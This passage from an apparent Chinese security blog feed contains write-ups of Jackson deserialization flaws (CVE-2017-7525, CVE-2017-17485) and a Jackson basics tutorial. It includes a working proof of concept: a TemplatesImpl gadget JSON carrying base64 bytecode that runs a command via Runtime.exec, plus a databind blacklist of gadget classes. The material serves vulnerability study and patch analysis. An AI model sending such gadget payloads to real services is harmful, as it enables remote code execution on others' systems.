</span></span><br><span class="line">    s.add(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1737]; JDK provided  </span></span><br><span class="line">    s.add(<span class="string">&quot;java.util.logging.FileHandler&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1737]; 3rd party  </span></span><br><span class="line">    <span class="comment">//s.add(&quot;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&quot;); // deprecated by [databind#1855]  </span></span><br><span class="line">    s.add(<span class="string">&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1855]: more 3rd party  </span></span><br><span class="line">    s.add(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);  </span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再往下看，这里会把所有 <code>org.springframe</code> 开头的类名做处理</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/fullStartsBan.png" class><p>先进行黑名单过滤，发现类名不在黑名单后再判断是否是以 <code>org.springframe</code> 开头的类名，是的话循环遍历目标类的父类是否为 <code>AbstractPointcutAdviso</code> 或 <code>AbstractApplicationContext</code>，是的话跳出循环然后抛出异常：</p><p>而我们的利用类其继承关系是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">…-&gt;AbstractApplicationContext-&gt;AbstractRefreshableApplicationContext-&gt;AbstractRefreshableConfigApplicationContext-&gt;AbstractXmlApplicationContext-&gt;ClassPathXmlApplicationContext</span><br></pre></td></tr></table></figure><p>可以看到，ClassPathXmlApplicationContext 类是继承自 AbstractApplicationContext 类的，而该类会被过滤掉，从而没办法成功绕过利用。</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" href="http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89">http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2017-17485 Jackson 反序列化</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson 反序列化（二）CVE-2017-7525</title>
    <link href="https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/"/>
    <id>https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/</id>
    <published>2023-12-07T12:06:00.000Z</published>
    <updated>2023-12-07T12:41:02.136Z</updated>
    
    <content type="html"><![CDATA[<p>基于 TemplatesImpl 利用链</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.6 系列 &lt; 2.6.7.1<br>Jackson 2.7 系列 &lt; 2.7.9.1<br>Jackson 2.8 系列 &lt; 2.8.8.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>由于是打的 TemplatesImpl 链，所以要求 JDK 版本是 7u21 或者 8u20，动态代理相关的链子，这部分之前已经分析过了</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><strong>Test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SimpleCalc. java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleCalc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleCalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PoC.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\evilClass\\SimpleCalc.class&quot;</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;drun1baby&#x27;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);  </span><br><span class="line">        System.out.printf(jsonInput);  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">        Test test;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            test = mapper.readValue(jsonInput, Test.class);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(cls);  </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);  </span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];  </span><br><span class="line">        fileInputStream.read(bytes);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> DatatypeConverter.printBase64Binary(bytes);  </span><br><span class="line">        <span class="keyword">return</span> base64Encoded;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/Calc.png" class><p>其实这里看完代码之后马上就有一个问题：Jackson 是调用任意的构造函数与任意的 setter 方法，为什么会触发这条链子呢？</p><p>7u21 这条链子本质上其实是 TemplateImpl 类的类动态加载，配合上动态代理来打的，可是这里不论是动态代理，还是 <code>TemplatesImpl.getOutputProperties()</code>，都和 Jackson 没关系。所以这里可以说是非常疑惑了</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>下断点调试</p><p>首先是第一次到 <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#deserialize</code> 方法，反序列化 Test 类，会走到其构造函数里面，并且继续处理 <code>object</code></p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/handleObject.png" class><p>继续往下，下一步是反序列化 <code>object</code> 里面的数据。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/beanPropertiesChange.png" class><p>这里可以看到 <code>_beanProperties</code> 属性，其中包含了哪些呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Properties=[uriresolver([simple type, <span class="keyword">class</span> <span class="title class_">javax</span>.xml.transform.URIResolver]), transletBytecodes([array type, component type: [array type, component type: [simple type, <span class="keyword">class</span> <span class="title class_">byte</span> %&#125;]), stylesheetDOM([simple type, <span class="keyword">class</span> <span class="title class_">com</span>.sun.org.apache.xalan.internal.xsltc.DOM]), transletName([simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String]), outputProperties([map type; <span class="keyword">class</span> <span class="title class_">java</span>.util.Properties, [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String] -&gt; [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String %&#125;)]</span><br></pre></td></tr></table></figure><p>除了 setter 函数中的属性之外，还有 <code>outputProperties</code>，为什么 <code>outputProperties</code> 会被拿到呢？因为 <code>outputProperties</code> 属性有相应的 getter 方法，而其他属性却没有</p><p>接着来看看对于 <code>outputProperties</code> 是怎么处理的</p><p><strong>outputProperties 属性在 <code>deserializeAndSet()</code> 函数中是通过反射机制调用它的 getter 方法，这就是该利用链能被成功触发的原因</strong></p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/getter.png" class><p>这里也指出了一条攻击利用手法，也就是只要构造函数中存在的属性，不存在 setter 方法时，都会自动调到 getter 方法。</p><p>从而就能够利用成功了。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/getOutputProperties.png" class><p>后续就是最基础的 TemplatesImpl 动态加载字节码的过程，不再展开了</p><h2 id="0x05-其他细节"><a href="#0x05-其他细节" class="headerlink" title="0x05 其他细节"></a>0x05 其他细节</h2><h3 id="高版本-JDK-不能触发的原因——-tfactory"><a href="#高版本-JDK-不能触发的原因——-tfactory" class="headerlink" title="高版本 JDK 不能触发的原因—— _tfactory"></a>高版本 JDK 不能触发的原因—— <code>_tfactory</code></h3><p>在大版本下，JDK1.7 和 1.8 中，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 类是有所不同的。</p><p>当然，在小版本较高的 1.7 和某些 1.8 的还是能够成功触发的，具体的可自行测试。</p><p>区别在于新建 TransletClassLoader 类实例的代码，其中调用了 <code>_factory</code> 属性，但是该属性值我们没有在 PoC 中设置，默认为 null，于是就会抛出异常了。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/tfactory.png" class><p>而 Jackson 也是无法设置 <code>_tfactory</code> 的，因为 <code>_tfactory</code> 在原本的 <code>TemplatesImpl</code> 类中都没有 getter 或 setter 方法，这就拿不到了。</p><h2 id="0x06-补丁分析"><a href="#0x06-补丁分析" class="headerlink" title="0x06 补丁分析"></a>0x06 补丁分析</h2><p>这里将 jackson-databind-2.7.9 换成 jackson-databind-2.7.9.1。<br>尝试运行会报错如下，显示因为某些安全原因禁止了该类的加载：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/fix.png" class><p>调试分析，在调用 <code>BeanDeserializerFactory.createBeanDeserializer()</code> 函数创建 Bean 反序列化器的时候，其中会调用 <code>checkIllegalTypes()</code> 函数提取当前类名，然后使用黑名单进行过滤：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/blackList.png" class><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" href="http://www.mi1k7ea.com/2019/11/16/Jackson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%94CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/">http://www.mi1k7ea.com/2019/11/16/Jackson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%94CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2017-7527 Jackson 反序列化</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson 反序列化（一）漏洞原理</title>
    <link href="https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</id>
    <published>2023-12-07T12:05:52.000Z</published>
    <updated>2023-12-07T12:40:59.070Z</updated>
    
    <content type="html"><![CDATA[<p>迫在眉睫，用到的太多了</p><h2 id="0x01-Jackson-基本使用"><a href="#0x01-Jackson-基本使用" class="headerlink" title="0x01 Jackson 基本使用"></a>0x01 Jackson 基本使用</h2><h3 id="Jackson-简介"><a href="#Jackson-简介" class="headerlink" title="Jackson 简介"></a>Jackson 简介</h3><p>Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。</p><p>由于其使用简单，速度较快，且不依靠除 JDK 外的其他库，被众多用户所使用。</p><h3 id="使用-Jackson-进行序列化与反序列化"><a href="#使用-Jackson-进行序列化与反序列化" class="headerlink" title="使用 Jackson 进行序列化与反序列化"></a>使用 Jackson 进行序列化与反序列化</h3><p>使用的 Jackson 包环境为 2.7.9 版本</p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>自定义 Person 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s&quot;</span>, age, name);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着编写 Jackson 的序列化与反序列化代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;Drunkbaby&quot;</span>;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;&quot;age&quot;:6,&quot;name&quot;:&quot;Drunkbaby&quot;&#125;</span></span><br><span class="line"><span class="comment">// Person.age=6, Person.name=Drunkbaby</span></span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/JacksonTest.png" class><h2 id="0x02-Jackson-对于多态问题的解决-——-JacksonPolymorphicDeserialization"><a href="#0x02-Jackson-对于多态问题的解决-——-JacksonPolymorphicDeserialization" class="headerlink" title="0x02 Jackson 对于多态问题的解决 —— JacksonPolymorphicDeserialization"></a>0x02 Jackson 对于多态问题的解决 —— JacksonPolymorphicDeserialization</h2><p>简单地说，Java 多态就是同一个接口使用不同的实例而执行不同的操作。</p><p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？—— Jackson 实现了 JacksonPolymorphicDeserialization 机制来解决这个问题。</p><p>JacksonPolymorphicDeserialization 即 Jackson 多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如 Object、接口或抽象类，则可以在 JSON 字符串中指定其具体类型，Jackson 将生成具体类型的实例。</p><p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即 <code>DefaultTyping</code> 和 <code>@JsonTypeInfo</code> 注解。这里和前面学过的 fastjson 是很相似的。</p><p>下面具体介绍一下。</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>Jackson 提供一个 enableDefaultTyping 设置，其包含 4 个值，查看 <code>jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.java</code> 可看到相关介绍信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">DefaultTyping</span> &#123;  </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * This value means that only properties that have  </span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including  </span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default  </span></span><br><span class="line"><span class="comment">        * typing.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       JAVA_LANG_OBJECT,  </span><br><span class="line">         </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;  </span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).  </span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       OBJECT_AND_NON_CONCRETE,  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;  </span></span><br><span class="line"><span class="comment">        * plus all array types for them.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       NON_CONCRETE_AND_ARRAYS,  </span><br><span class="line">         </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of  </span></span><br><span class="line"><span class="comment">        * &quot;natural&quot; types (String, Boolean, Integer, Double), which  </span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for  </span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       NON_FINAL  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><strong>默认情况下，即无参数的 enableDefaultTyping 